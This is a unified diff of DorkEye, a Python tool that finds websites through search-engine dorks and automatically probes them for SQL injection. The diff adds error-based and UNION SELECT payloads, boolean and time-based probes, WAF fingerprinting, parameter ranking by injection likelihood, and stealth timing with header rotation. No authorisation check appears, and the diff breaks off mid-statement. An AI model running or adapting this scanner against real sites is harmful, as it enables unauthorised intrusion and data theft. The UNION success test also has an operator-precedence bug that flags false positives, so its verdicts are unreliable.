@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-DorkEye v4.5 | OSINT Dorking Tool
+DorkEye v4.6 | OSINT Dorking Tool
 Author: xPloits3c I.C.W.T| https://github.com/xPloits3c/DorkEye
 """
 
@@ -17,8 +17,8 @@ import csv
 import re
 import signal
 import statistics
-import queue       # ← added for DDGS producer/consumer
-import threading   # ← added for DDGS producer thread
+import queue
+import threading
 from datetime import datetime
 from pathlib import Path
 from typing import List, Dict, Set, Tuple, Optional
@@ -44,9 +44,23 @@ console = Console()
 VALID_MODES = ["soft", "medium", "aggressive"]
 
 # ══════════════════════════════════════════════════════════════
+#  [7] Termux / Android auto-detection
+#  Detected once at import time; downstream constants are
+#  adjusted immediately so every subsystem picks them up.
+# ══════════════════════════════════════════════════════════════
+
+def _detect_termux_android() -> bool:
+    """Return True when running inside Termux on Android."""
+    return (
+        "TERMUX_VERSION" in os.environ
+        or os.environ.get("PREFIX", "").startswith("/data/data/com.termux")
+        or os.path.isdir("/data/data/com.termux")
+    )
+
+TERMUX_IS_ANDROID: bool = _detect_termux_android()
+
+# ══════════════════════════════════════════════════════════════
 #  Ctrl+C interrupt state
-#  - Single Ctrl+C  →  skip current dork / SQLi test
-#  - Double Ctrl+C  →  exit immediately (two presses within 1.5 s)
 # ══════════════════════════════════════════════════════════════
 
 _last_interrupt_time: float = 0.0
@@ -55,10 +69,6 @@ _exit_requested: bool       = False
 
 
 def _sigint_handler(signum, frame):
-    # NOTE: sys.stderr.write() is async-signal-safe; console.print() is NOT
-    # (Rich holds a threading.Lock internally — calling it from a signal handler
-    # while the main thread already holds that lock causes a deadlock, which is
-    # more likely on Android/Termux due to its scheduler).
     global _last_interrupt_time, _skip_current, _exit_requested
     now = time.monotonic()
     if now - _last_interrupt_time < 1.5:
@@ -74,12 +84,6 @@ def _sigint_handler(signum, frame):
 
 signal.signal(signal.SIGINT, _sigint_handler)
 
-
-# ══════════════════════════════════════════════════════════════
-#  Interruptible sleep  ← NEW
-#  Replaces bare time.sleep() in backoff and delay loops so
-#  Ctrl+C is always responsive during waits.
-# ══════════════════════════════════════════════════════════════
 
 def _interruptible_sleep(seconds: float, step: float = 0.25) -> None:
     """Sleep in small steps; return immediately if skip/exit is flagged."""
@@ -111,9 +115,16 @@ def print_banner():
         "[bold yellow]  V[/bold yellow]"
     )
 
+    # [7] Show Android badge when detected
+    android_badge = (
+        "\n[bold yellow]▸ Platform[/bold yellow] [dim]│[/dim]  "
+        "[bold green]Android / Termux  ⚡ battery-saver active[/bold green]"
+        if TERMUX_IS_ANDROID else ""
+    )
+
     INFO = (
         "[bold white]OSINT DORKING TOOL[/bold white]\n"
-        "[bold green]v4.5[/bold green]  [dim]stable[/dim]\n"
+        "[bold green]v4.6[/bold green]  [dim]stable[/dim]\n"
         "\n"
         "[dim]▸ Author[/dim]  [dim]│[/dim]  [cyan]xPloits3c I.C.W.T[/cyan]\n"
         "[dim]▸ GitHub[/dim]  [dim]│[/dim]  [cyan]github.com/xPloits3c/DorkEye[/cyan]\n"
@@ -123,6 +134,7 @@ def print_banner():
         "[dim]▸ SQLi  [/dim]  [dim]│[/dim]  [green]Real detection[/green]\n"
         "[dim]▸ Stealth[/dim] [dim]│[/dim]  [green]HTTP fingerprinting[/green]\n"
         "[dim]▸ Analyzer[/dim][dim]│[/dim]  [green]Extract metadata[/green]"
+        + android_badge
     )
 
     grid = Table.grid(padding=(0, 6))
@@ -420,23 +432,71 @@ class CircuitBreaker:
 
 
 # ══════════════════════════════════════════════════════════════
-#  SQLiDetector False Positive Reduction
+#  SQLiDetector — constants
+#  [7] Android/Termux: reduced timeouts and sample counts to
+#      lower CPU/battery usage on constrained hardware.
 # ══════════════════════════════════════════════════════════════
 
-_CONNECT_TIMEOUT  = 4
-_DEFAULT_READ     = 8
+_CONNECT_TIMEOUT  = 3 if TERMUX_IS_ANDROID else 4
+_DEFAULT_READ     = 6 if TERMUX_IS_ANDROID else 8
 _TIMEBASED_MARGIN = 2.5
 _SLEEP_DELAY      = 3
-_BASELINE_SAMPLES = 2
+_BASELINE_SAMPLES = 1 if TERMUX_IS_ANDROID else 2   # [7]
 _MAX_BASELINE_S   = 6.0
 
-_PROBE_SAMPLES        = 3
-_PROBE_NOISE_BUFFER   = 0.04
-_PROBE_MAX_THRESHOLD  = 0.18
-_BOOL_SAMPLES         = 3
-_TIMEBASED_CONFIRM    = 2
+_PROBE_SAMPLES       = 2 if TERMUX_IS_ANDROID else 3    # [7]
+_PROBE_NOISE_BUFFER  = 0.04
+_PROBE_MAX_THRESHOLD = 0.18
+_BOOL_SAMPLES        = 2 if TERMUX_IS_ANDROID else 3    # [7]
+_TIMEBASED_CONFIRM   = 1 if TERMUX_IS_ANDROID else 2    # [7]
+_UNION_COLUMNS_MAX   = 5                                 # [5]
+
 _SCRIPT_TAG_RE = re.compile(r"<script[\s\S]*?</script\s*>", re.IGNORECASE)
 
+# ══════════════════════════════════════════════════════════════
+#  [4] WAF detection signatures
+#  Keys: canonical WAF name.
+#  Values: substrings checked in response headers (keys/values)
+#          and in the first 2 KB of the response body.
+# ══════════════════════════════════════════════════════════════
+
+WAF_SIGNATURES: Dict[str, List[str]] = {
+    "cloudflare":  ["cf-ray", "__cfduid", "cloudflare", "attention required! | cloudflare"],
+    "modsecurity": ["mod_security", "modsecurity", "406 not acceptable", "not acceptable!"],
+    "wordfence":   ["wordfence", "generated by wordfence"],
+    "sucuri":      ["x-sucuri-id", "sucuri website firewall", "access denied - sucuri"],
+    "imperva":     ["x-iinfo", "incapsula incident", "_incap_ses_"],
+    "akamai":      ["akamai", "x-akamai-transformed", "reference #18"],
+    "f5_bigip":    ["x-waf-event-info", "bigipserver", "the requested url was rejected"],
+    "barracuda":   ["barra_counter_session", "barracuda"],
+    "fortiweb":    ["fortigate", "fortiweb"],
+    "aws_waf":     ["x-amzn-requestid", "awselb", "forbidden - aws waf"],
+    "denyall":     ["denyall", "x-denyall"],
+    "reblaze":     ["x-reblaze-protection"],
+}
+
+# ══════════════════════════════════════════════════════════════
+#  [6] Parameter priority tables
+# ══════════════════════════════════════════════════════════════
+
+_HIGH_PRIORITY_PARAMS: frozenset = frozenset({
+    "id", "pid", "uid", "nid", "tid", "cid", "rid", "eid", "fid", "gid",
+    "page", "pg", "p", "num", "item", "product", "prod", "article",
+    "cat", "category", "sort", "order", "by", "type", "idx", "index",
+    "ref", "record", "row", "entry", "post", "news", "view",
+})
+
+_MEDIUM_PRIORITY_PARAMS: frozenset = frozenset({
+    "search", "q", "query", "s", "keyword", "kw", "term", "find",
+    "name", "user", "username", "login", "email", "mail",
+    "city", "country", "region", "lang", "language",
+    "filter", "tag", "label", "topic", "subject", "section",
+})
+
+
+# ══════════════════════════════════════════════════════════════
+#  SQLiDetector
+# ══════════════════════════════════════════════════════════════
 
 class SQLiDetector:
 
@@ -488,6 +548,16 @@ class SQLiDetector:
         ],
     }
 
+    # UNION column-count mismatch patterns (server IS processing the UNION)
+    _UNION_COL_MISMATCH_RE = re.compile(
+        r"(The used SELECT statements have a different number of columns"
+        r"|each UNION query must have the same number of columns"
+        r"|SELECTs to the left and right of UNION do not have the same number"
+        r"|ORA-01789"         # Oracle
+        r"|column count doesn.t match)",
+        re.IGNORECASE,
+    )
+
     def __init__(self, stealth: bool = False, timeout: int = _DEFAULT_READ):
         self.stealth             = stealth
         self.read_timeout        = timeout
@@ -512,27 +582,121 @@ class SQLiDetector:
     def _timeout(self, extra_read: float = 0) -> Tuple[int, float]:
         return (_CONNECT_TIMEOUT, self.read_timeout + extra_read)
 
+    # ──────────────────────────────────────────────────────────
+    #  _run_interruptible
+    #
+    #  Root-cause fix for Ctrl+C not working during HTTP calls:
+    #
+    #  requests.Session.get/post() block the Python interpreter
+    #  inside C-level socket.recv().  While blocked there, the
+    #  GIL is held by the syscall — Python can never schedule
+    #  the signal-handler flag check until the call returns
+    #  (which can be up to 17-36 s in the worst case).
+    #
+    #  Fix: run every network call in a daemon thread.
+    #  The main thread polls a threading.Event every 0.1 s,
+    #  checking _skip_current/_exit_requested between polls.
+    #  Ctrl+C is therefore always acted on within ~100 ms
+    #  regardless of what the network is doing.
+    #  The in-flight daemon thread is abandoned (it will
+    #  eventually time out on its own, harmlessly).
+    # ──────────────────────────────────────────────────────────
+
+    def _run_interruptible(
+        self,
+        fn,
+        total_timeout: float,
+        on_connect_error=None,
+    ):
+        """
+        Run fn() in a daemon thread; poll every 0.1 s for skip/exit.
+        Returns fn()'s return value, or None on skip/exit/timeout.
+        on_connect_error: optional zero-arg callback called when
+        ConnectTimeout/ConnectionError is raised inside fn().
+        """
+        _POLL = 0.1
+        result_holder = [None]
+        exc_holder    = [None]
+        done_event    = threading.Event()
+
+        def _worker():
+            try:
+                result_holder[0] = fn()
+            except (requests.exceptions.ConnectTimeout,
+                    requests.exceptions.ConnectionError) as e:
+                exc_holder[0] = e
+            except Exception:
+                pass
+            finally:
+                done_event.set()
+
+        threading.Thread(target=_worker, daemon=True).start()
+
+        deadline = total_timeout + 1.0   # small grace period
+        elapsed  = 0.0
+        while elapsed < deadline:
+            if _exit_requested or _skip_current:
+                return None
+            if done_event.wait(timeout=_POLL):
+                if exc_holder[0] is not None and on_connect_error:
+                    on_connect_error()
+                return result_holder[0]
+            elapsed += _POLL
+
+        return None   # timed out (should never happen given requests timeout)
+
     def _get(self, url: str, extra_read: float = 0) -> Optional[requests.Response]:
         if self.circuit_breaker.is_dead(url):
             return None
+
         self.fingerprint_rotator.get_random()
         headers = self.fingerprint_rotator.build_headers()
-        try:
+        timeout = self._timeout(extra_read)
+
+        def _do():
             return self._session.get(
                 url,
                 headers         = headers,
-                timeout         = self._timeout(extra_read),
+                timeout         = timeout,
                 verify          = False,
                 allow_redirects = True,
             )
-        except (requests.exceptions.ConnectTimeout,
-                requests.exceptions.ConnectionError):
-            self.circuit_breaker.mark_dead(url)
-            return None
-        except requests.exceptions.ReadTimeout:
-            return None
-        except Exception:
-            return None
+
+        # Total time the underlying request is allowed to take
+        total = _CONNECT_TIMEOUT + self.read_timeout + extra_read
+
+        return self._run_interruptible(
+            _do,
+            total_timeout    = total,
+            on_connect_error = lambda: self.circuit_breaker.mark_dead(url),
+        )
+
+    # ──────────────────────────────────────────────────────────
+    #  [4] WAF Detection
+    # ──────────────────────────────────────────────────────────
+
+    def _detect_waf(self, response: requests.Response) -> Optional[str]:
+        """
+        Return the canonical WAF name if a WAF fingerprint is found in
+        response headers or the first 2 KB of the body, else None.
+
+        A 403/406/429 with an unusually short body triggers a generic
+        'generic_waf' label even if no named WAF matches.
+        """
+        headers_keys   = {k.lower() for k in response.headers}
+        headers_values = " ".join(v.lower() for v in response.headers.values())
+        body_snippet   = response.text[:2000].lower()
+
+        for waf_name, sigs in WAF_SIGNATURES.items():
+            for sig in sigs:
+                if sig in headers_keys or sig in headers_values or sig in body_snippet:
+                    return waf_name
+
+        # Generic heuristic: blocked status + minimal body
+        if response.status_code in (403, 406, 419, 429) and len(response.text) < 600:
+            return "generic_waf"
+
+        return None
 
     def _measure_baseline_latency(self, url: str) -> Optional[float]:
         times = []
@@ -588,27 +752,71 @@ class SQLiDetector:
                     return (db_type, pattern)
         return None
 
+    # ──────────────────────────────────────────────────────────
+    #  [6] Parameter prioritisation
+    # ──────────────────────────────────────────────────────────
+
+    def _prioritize_params(self, params: Dict[str, str]) -> List[str]:
+        """
+        Return parameter names sorted by injection likelihood:
+        1. numeric value  |  known high-priority name  → HIGH
+        2. known medium-priority name                  → MEDIUM
+        3. everything else                             → LOW
+
+        Within each tier the original insertion order is preserved.
+        """
+        high: List[str] = []
+        medium: List[str] = []
+        low: List[str] = []
+
+        for param, value in params.items():
+            p_lower = param.lower()
+            if value.isdigit() or p_lower in _HIGH_PRIORITY_PARAMS:
+                high.append(param)
+            elif p_lower in _MEDIUM_PRIORITY_PARAMS:
+                medium.append(param)
+            else:
+                low.append(param)
+
+        return high + medium + low
+
+    # ──────────────────────────────────────────────────────────
+    #  [2] _probe_parameter — baseline_status bug fix
+    #
+    #  Original bug: baseline_status was captured inside the
+    #  noise-sampling loop only on i==0, mixing baseline capture
+    #  with noise measurement.  If the first _get() returned None
+    #  we'd short-circuit before setting it; also, the noise loop
+    #  counted that first request both as noise sample AND as the
+    #  status baseline, making the two concerns inconsistent.
+    #
+    #  Fix: dedicate a separate request to capture baseline_status
+    #  BEFORE the noise loop.  That first response is also used as
+    #  the first noise sample (no extra network round-trip).
+    # ──────────────────────────────────────────────────────────
+
     def _probe_parameter(self, url: str, param_name: str, baseline_content: str) -> bool:
         if self.circuit_breaker.is_dead(url):
             return False
 
-        noise_samples: List[float] = []
-        baseline_status: Optional[int] = None
+        # ── Dedicated baseline request (fix for bug [2]) ──────
+        r_init = self._get(url)
+        if r_init is None:
+            return False
+        baseline_status: int = r_init.status_code
+        first_sim            = difflib.SequenceMatcher(None, baseline_content, r_init.text).ratio()
+        noise_samples: List[float] = [1.0 - first_sim]
 
-        for i in range(_PROBE_SAMPLES):
+        # ── Remaining noise samples ────────────────────────────
+        for _ in range(_PROBE_SAMPLES - 1):   # already have one sample
             if _exit_requested or _skip_current:
                 return False
             r = self._get(url)
             if r is None:
                 return False
-            if i == 0:
-                baseline_status = r.status_code
             sim = difflib.SequenceMatcher(None, baseline_content, r.text).ratio()
             noise_samples.append(1.0 - sim)
             _interruptible_sleep(0.2)
-
-        if not noise_samples:
-            return False
 
         noise_level = statistics.median(noise_samples)
 
@@ -617,12 +825,14 @@ class SQLiDetector:
 
         adaptive_threshold = noise_level + _PROBE_NOISE_BUFFER
 
+        # ── Single-quote payload probe ─────────────────────────
         test_url  = self._inject_payload(url, param_name, "1'")
         r_payload = self._get(test_url)
         if r_payload is None:
             return False
 
-        if baseline_status is not None and r_payload.status_code != baseline_status:
+        # Status-code divergence → server reacted differently → interesting
+        if r_payload.status_code != baseline_status:
             return False
 
         payload_noise = 1.0 - difflib.SequenceMatcher(
@@ -637,6 +847,7 @@ class SQLiDetector:
             "vulnerable": False,
             "confidence": SQLiConfidence.NONE.value,
             "evidence":   [],
+            "waf":        None,   # [4]
         }
         payloads = [
             "1' AND extractvalue(0,concat(0x7e,'TEST',0x7e)) AND '1'='1",
@@ -648,10 +859,18 @@ class SQLiDetector:
                 break
             if _exit_requested or _skip_current:
                 break
+
             test_url = self._inject_payload(url, param_name, payload)
             response = self._get(test_url)
             if response is None:
                 continue
+
+            # [4] WAF check — blocked response is not a real SQL error
+            waf = self._detect_waf(response)
+            if waf:
+                result["waf"] = waf
+                result["evidence"].append(f"WAF detected ({waf}): error-based skipped")
+                break
 
             match = self._match_sql_errors(response.text)
             if match:
@@ -665,6 +884,114 @@ class SQLiDetector:
 
             if self.stealth:
                 _interruptible_sleep(random.uniform(1.5, 3))
+
+        return result
+
+    # ──────────────────────────────────────────────────────────
+    #  [5] UNION-based probe
+    #
+    #  Strategy:
+    #    1. For n = 1 … _UNION_COLUMNS_MAX, inject a UNION SELECT
+    #       with n NULL columns using multiple syntax variants.
+    #    2. If a column-count mismatch error appears the server IS
+    #       processing the UNION (SQLi confirmed, wrong col count).
+    #       We record the mismatch and continue to find the right n.
+    #    3. When mismatch errors stop and the response length
+    #       differs significantly from baseline, UNION succeeded.
+    #    4. A WAF block on any attempt aborts the probe early.
+    # ──────────────────────────────────────────────────────────
+
+    def _test_union_based(
+        self, url: str, param_name: str, baseline_len: int
+    ) -> Dict:
+        result = {
+            "method":     "union_based",
+            "vulnerable": False,
+            "confidence": SQLiConfidence.NONE.value,
+            "evidence":   [],
+            "waf":        None,
+        }
+
+        mismatch_at: List[int] = []   # column counts that triggered mismatch
+
+        for n_cols in range(1, _UNION_COLUMNS_MAX + 1):
+            if self.circuit_breaker.is_dead(url):
+                break
+            if _exit_requested or _skip_current:
+                break
+
+            null_cols = ",".join(["NULL"] * n_cols)
+            # Four syntax variants: quoted/unquoted × comment style
+            payloads = [
+                f"' UNION SELECT {null_cols}--",
+                f"' UNION SELECT {null_cols}#",
+                f"-1 UNION SELECT {null_cols}--",
+                f"0 UNION ALL SELECT {null_cols}--",
+            ]
+
+            for payload in payloads:
+                if _exit_requested or _skip_current:
+                    break
+
+                test_url = self._inject_payload(url, param_name, payload)
+                response = self._get(test_url)
+                if response is None:
+                    continue
+
+                # [4] WAF check
+                waf = self._detect_waf(response)
+                if waf:
+                    result["waf"] = waf
+                    result["evidence"].append(
+                        f"WAF detected ({waf}): UNION probe aborted at {n_cols} cols"
+                    )
+                    return result
+
+                body = response.text
+
+                # Column count mismatch → server is processing the UNION
+                if self._UNION_COL_MISMATCH_RE.search(body):
+                    if n_cols not in mismatch_at:
+                        mismatch_at.append(n_cols)
+                        result["evidence"].append(
+                            f"UNION col-mismatch at n={n_cols} — server processes UNION"
+                        )
+                    break  # try next column count
+
+                # SQL error from a different cause → still confirms injection
+                sql_match = self._match_sql_errors(body)
+                if sql_match:
+                    db_type, pattern = sql_match
+                    result["vulnerable"] = True
+                    result["confidence"] = SQLiConfidence.HIGH.value
+                    result["evidence"].append(
+                        f"UNION triggered {db_type.upper()} error at n={n_cols}: {pattern[:50]}"
+                    )
+                    return result
+
+                # Significant length change with 200 OK → UNION probably worked
+                len_diff = abs(len(body) - baseline_len)
+                if (response.status_code == 200
+                        and len_diff > baseline_len * 0.20
+                        and n_cols in mismatch_at or mismatch_at):
+                    result["vulnerable"] = True
+                    result["confidence"] = SQLiConfidence.MEDIUM.value
+                    result["evidence"].append(
+                        f"UNION SELECT {n_cols} cols: response Δ={len_diff}B "
+                        f"(prev mismatches at cols {mismatch_at})"
+                    )
+                    return result
+
+                if self.stealth:
+                    _interruptible_sleep(random.uniform(0.5, 1.5))
+
+        # Even without full exploitation, confirmed mismatch errors → LOW confidence
+        if mismatch_at:
+            result["vulnerable"] = True
+            result["confidence"] = SQLiConfidence.LOW.value
+            result["evidence"].append(
+                f"UNION col-mismatch at col(s) {mismatch_at}: UNION syntax processed by server"
+            )
 
         return result
 
@@ -780,6 +1107,15 @@ class SQLiDetector:
             if not sleep_triggered:
                 continue
 
+            # [4] WAF check on the sleep response
+            if response is not None:
+                waf = self._detect_waf(response)
+                if waf:
+                    result["evidence"].append(
+                        f"WAF detected ({waf}): time-based latency may be firewall delay"
+                    )
+                    continue
+
             neutral_url      = self._inject_payload(url, param_name, neutral_payload)
             confirm_times:   List[float] = []
             confirm_failures = 0
@@ -789,8 +1125,8 @@ class SQLiDetector:
                     break
                 if _exit_requested or _skip_current:
                     break
-                t_c      = time.monotonic()
-                r_c      = self._get(neutral_url)
+                t_c       = time.monotonic()
+                r_c       = self._get(neutral_url)
                 elapsed_c = time.monotonic() - t_c
 
                 if r_c is None:
@@ -802,13 +1138,12 @@ class SQLiDetector:
 
             if confirm_failures > 0:
                 continue
-
             if not confirm_times:
                 continue
 
-            confirm_avg = sum(confirm_times) / len(confirm_times)
-
+            confirm_avg       = sum(confirm_times) / len(confirm_times)
             confirm_threshold = baseline + _TIMEBASED_MARGIN
+
             if confirm_avg <= confirm_threshold:
                 result["vulnerable"] = True
                 result["confidence"] = SQLiConfidence.MEDIUM.value
@@ -822,6 +1157,14 @@ class SQLiDetector:
 
         return result
 
+    # ──────────────────────────────────────────────────────────
+    #  test_sqli — orchestrator
+    #  [3] Complete confidence logic: LOW / MEDIUM / HIGH / CRITICAL
+    #  [5] UNION-based probe added to per-param loop
+    #  [6] Parameters tested in priority order
+    #  [4] WAF recorded in top-level result
+    # ──────────────────────────────────────────────────────────
+
     def test_sqli(self, url: str) -> Dict:
         result = {
             "url":                url,
@@ -830,6 +1173,7 @@ class SQLiDetector:
             "tests":              [],
             "tested":             False,
             "message":            "",
+            "waf_detected":       None,   # [4]
         }
 
         if not self.has_query_params(url):
@@ -851,55 +1195,114 @@ class SQLiDetector:
             result["message"] = "Could not establish baseline (host unreachable)"
             return result
 
-        _, baseline_content, baseline_len = baseline
-        confidence_scores: List[int] = []
+        baseline_status, baseline_content, baseline_len = baseline
 
-        for param_name in params.keys():
+        # [4] Detect WAF on clean baseline response
+        baseline_resp_obj = self._get(url)
+        if baseline_resp_obj is not None:
+            waf_on_baseline = self._detect_waf(baseline_resp_obj)
+            if waf_on_baseline:
+                result["waf_detected"] = waf_on_baseline
+                result["message"] = (
+                    f"WAF detected ({waf_on_baseline}) on baseline — "
+                    f"results may have false negatives"
+                )
+
+        # [3] Per-param score accumulator
+        # Score scale per technique:
+        #   error_based HIGH → 3  |  error_based other → 2
+        #   union HIGH       → 3  |  union MEDIUM       → 2  |  union LOW → 1
+        #   bool_blind       → 2
+        #   time_based HIGH  → 3  |  time_based other   → 2
+        # Per-param total ≥ 5 → CRITICAL (two independent strong signals)
+        per_param_scores: List[int] = []
+
+        # [6] Test params in priority order
+        for param_name in self._prioritize_params(params):
 
             if self.circuit_breaker.is_dead(url):
                 result["message"] = "Host became unreachable during testing"
                 break
             if _exit_requested or _skip_current:
                 break
-
             if not self._probe_parameter(url, param_name, baseline_content):
                 continue
 
+            param_score = 0
+
+            # ── Error-based ───────────────────────────────────
             error_result = self._test_error_based(url, param_name)
             result["tests"].append(error_result)
 
-            if error_result["vulnerable"] and error_result["confidence"] == SQLiConfidence.HIGH.value:
-                result["vulnerable"]         = True
-                result["overall_confidence"] = SQLiConfidence.HIGH.value
-                result["message"]            = f"Tested {len(params)} parameter(s)"
-                return result
+            # Propagate WAF discovery [4]
+            if error_result.get("waf") and not result["waf_detected"]:
+                result["waf_detected"] = error_result["waf"]
 
             if error_result["vulnerable"]:
-                confidence_scores.append(2)
+                if error_result["confidence"] == SQLiConfidence.HIGH.value:
+                    param_score += 3
+                    # Early return: HIGH error-based is definitive
+                    result["vulnerable"]         = True
+                    result["overall_confidence"] = SQLiConfidence.HIGH.value
+                    result["message"]            = f"Tested {len(params)} parameter(s)"
+                    return result
+                else:
+                    param_score += 2
 
+            # ── UNION-based [5] ───────────────────────────────
+            union_result = self._test_union_based(url, param_name, baseline_len)
+            result["tests"].append(union_result)
+
+            if union_result.get("waf") and not result["waf_detected"]:
+                result["waf_detected"] = union_result["waf"]
+
+            if union_result["vulnerable"]:
+                if union_result["confidence"] == SQLiConfidence.HIGH.value:
+                    param_score += 3
+                elif union_result["confidence"] == SQLiConfidence.MEDIUM.value:
+                    param_score += 2
+                else:  # LOW
+                    param_score += 1
+
+            # ── Boolean blind ─────────────────────────────────
             bool_result = self._test_boolean_blind(url, param_name, baseline_len)
             result["tests"].append(bool_result)
             if bool_result["vulnerable"]:
-                confidence_scores.append(2)
+                param_score += 2
 
+            # ── Time-based blind ──────────────────────────────
             time_result = self._test_time_based_blind(url, param_name)
             result["tests"].append(time_result)
             if time_result.get("vulnerable", False):
-                confidence_scores.append(
+                param_score += (
                     3 if time_result["confidence"] == SQLiConfidence.HIGH.value else 2
                 )
+
+            if param_score > 0:
+                per_param_scores.append(param_score)
 
             if self.stealth:
                 _interruptible_sleep(random.uniform(2, 4))
 
-        if confidence_scores:
-            avg = sum(confidence_scores) / len(confidence_scores)
-            if avg >= 3:
+        # ── [3] Aggregate confidence across all parameters ────
+        if per_param_scores:
+            best  = max(per_param_scores)
+            avg   = sum(per_param_scores) / len(per_param_scores)
+
+            result["vulnerable"] = True
+
+            # CRITICAL: at least one param has two strong independent signals
+            if best >= 5:
+                result["overall_confidence"] = SQLiConfidence.CRITICAL.value
+            # HIGH: single strong technique or consistent multi-param evidence
+            elif best >= 3 or avg >= 3:
                 result["overall_confidence"] = SQLiConfidence.HIGH.value
-                result["vulnerable"]         = True
-            elif avg >= 2:
+            # MEDIUM: moderate evidence on at least one param
+            elif best >= 2 or avg >= 2:
                 result["overall_confidence"] = SQLiConfidence.MEDIUM.value
-                result["vulnerable"]         = True
+            # LOW: weak signal (e.g. only UNION col-mismatch hinting)
+            else:
+                result["overall_confidence"] = SQLiConfidence.LOW.value
 
         result["message"] = f"Tested {len(params)} parameter(s)"
         return result
@@ -909,6 +1312,7 @@ class SQLiDetector:
             "url": url, "vulnerable": False,
             "overall_confidence": SQLiConfidence.NONE.value,
             "tests": [], "tested": False, "message": "",
+            "waf_detected": None,
         }
         if not post_data or self.circuit_breaker.is_dead(url):
             result["message"] = "No POST parameters or host unreachable"
@@ -919,6 +1323,11 @@ class SQLiDetector:
         if baseline_resp is None:
             result["message"] = "Could not establish baseline"
             return result
+
+        # [4] WAF check on baseline
+        waf = self._detect_waf(baseline_resp)
+        if waf:
+            result["waf_detected"] = waf
 
         confidence_scores = []
 
@@ -931,33 +1340,48 @@ class SQLiDetector:
             payload_dict             = post_data.copy()
             payload_dict[param_name] = str(post_data[param_name]) + "'"
 
-            try:
-                self.fingerprint_rotator.get_random()
-                response = self._session.post(
+            self.fingerprint_rotator.get_random()
+            _hdrs    = self.fingerprint_rotator.build_headers()
+            _data    = payload_dict
+            _timeout = self._timeout()
+
+            def _do_post():
+                return self._session.post(
                     url,
-                    data    = payload_dict,
-                    headers = self.fingerprint_rotator.build_headers(),
-                    timeout = self._timeout(),
+                    data    = _data,
+                    headers = _hdrs,
+                    timeout = _timeout,
                     verify  = False,
                 )
-                match = self._match_sql_errors(response.text)
-                if match:
-                    db_type, pattern = match
-                    result["vulnerable"] = True
-                    result["tests"].append({
-                        "method":    "post_error_based",
-                        "parameter": param_name,
-                        "db":        db_type,
-                        "evidence":  pattern[:60],
-                    })
-                    confidence_scores.append(3)
 
-            except (requests.exceptions.ConnectTimeout,
-                    requests.exceptions.ConnectionError):
-                self.circuit_breaker.mark_dead(url)
-                break
-            except Exception:
-                pass
+            response = self._run_interruptible(
+                _do_post,
+                total_timeout    = _CONNECT_TIMEOUT + self.read_timeout,
+                on_connect_error = lambda: self.circuit_breaker.mark_dead(url),
+            )
+            if response is None:
+                if self.circuit_breaker.is_dead(url):
+                    break
+                continue
+
+            # [4] Skip WAF-blocked responses
+            waf = self._detect_waf(response)
+            if waf:
+                if not result["waf_detected"]:
+                    result["waf_detected"] = waf
+                continue
+
+            match = self._match_sql_errors(response.text)
+            if match:
+                db_type, pattern = match
+                result["vulnerable"] = True
+                result["tests"].append({
+                    "method":    "post_error_based",
+                    "parameter": param_name,
+                    "db":        db_type,
+                    "evidence":  pattern[:60],
+                })
+                confidence_scores.append(3)
 
             if self.stealth:
                 _interruptible_sleep(random.uniform(2, 4))
@@ -977,6 +1401,7 @@ class SQLiDetector:
             "url": url, "vulnerable": False,
             "overall_confidence": SQLiConfidence.NONE.value,
             "tests": [], "tested": False, "message": "",
+            "waf_detected": None,
         }
         if not json_data or self.circuit_breaker.is_dead(url):
             result["message"] = "No JSON parameters or host unreachable"
@@ -994,31 +1419,43 @@ class SQLiDetector:
             payload_dict      = json_data.copy()
             payload_dict[key] = payload_dict[key] + "'"
 
-            try:
-                response = self._session.post(
+            _json    = payload_dict
+            _timeout = self._timeout()
+
+            def _do_json_post():
+                return self._session.post(
                     url,
-                    json    = payload_dict,
-                    timeout = self._timeout(),
+                    json    = _json,
+                    timeout = _timeout,
                     verify  = False,
                 )
-                match = self._match_sql_errors(response.text)
-                if match:
-                    db_type, pattern = match
-                    result["vulnerable"] = True
-                    result["tests"].append({
-                        "method":    "json_error_based",
-                        "parameter": key,
-                        "db":        db_type,
-                        "evidence":  pattern[:60],
-                    })
-                    confidence_scores.append(3)
 
-            except (requests.exceptions.ConnectTimeout,
-                    requests.exceptions.ConnectionError):
-                self.circuit_breaker.mark_dead(url)
-                break
-            except Exception:
-                pass
+            response = self._run_interruptible(
+                _do_json_post,
+                total_timeout    = _CONNECT_TIMEOUT + self.read_timeout,
+                on_connect_error = lambda: self.circuit_breaker.mark_dead(url),
+            )
+            if response is None:
+                continue
+
+            # [4] WAF check
+            waf = self._detect_waf(response)
+            if waf:
+                if not result["waf_detected"]:
+                    result["waf_detected"] = waf
+                continue
+
+            match = self._match_sql_errors(response.text)
+            if match:
+                db_type, pattern = match
+                result["vulnerable"] = True
+                result["tests"].append({
+                    "method":    "json_error_based",
+                    "parameter": key,
+                    "db":        db_type,
+                    "evidence":  pattern[:60],
+                })
+                confidence_scores.append(3)
 
             if self.stealth:
                 _interruptible_sleep(random.uniform(2, 4))
@@ -1047,6 +1484,12 @@ class SQLiDetector:
         if re.search(r"/\d+$", path) or re.search(r"/\w+$", path):
             response = self._get(url + "'")
             if response:
+                # [4] WAF check
+                waf = self._detect_waf(response)
+                if waf:
+                    result["evidence"].append(f"WAF detected ({waf}): path-based skipped")
+                    return result
+
                 match = self._match_sql_errors(response.text)
                 if match:
                     db_type, pattern = match
@@ -1201,9 +1644,6 @@ class DorkEyeEnhanced:
         self._total_results_at_last_extended_delay: int = 0
 
     def _hash_url(self, url: str) -> str:
-        # usedforsecurity=False: required on Python 3.9+ when OpenSSL runs in
-        # FIPS mode (some custom Android ROMs enforce this) — md5 is not used
-        # for any cryptographic purpose here, only as a fast dedup key.
         return hashlib.md5(url.encode(), usedforsecurity=False).hexdigest()
 
     def is_duplicate(self, url: str) -> bool:
@@ -1234,17 +1674,20 @@ class DorkEyeEnhanced:
         collected_since_last = len(self.results) - self._total_results_at_last_extended_delay
         return collected_since_last >= threshold
 
-    # ══════════════════════════════════════════════════════════════
+    # ──────────────────────────────────────────────────────────
     #  search_dork
-    # ══════════════════════════════════════════════════════════════
+    #  [1] Timestamp: human-readable "%Y-%m-%d %H:%M:%S"
+    # ──────────────────────────────────────────────────────────
 
     def search_dork(self, dork: str, count: int,
                     dork_index: int = 1, total_dorks: int = 1) -> List[Dict]:
         global _skip_current, _exit_requested
 
+        _ts = datetime.now().strftime("%H:%M:%S")
         console.print(
-            f"\n[bold cyan][ Dork {dork_index}/{total_dorks} ][/bold cyan]  "
-            f"[dim]Ctrl+C → skip this dork  │  Double Ctrl+C → quit[/dim]"
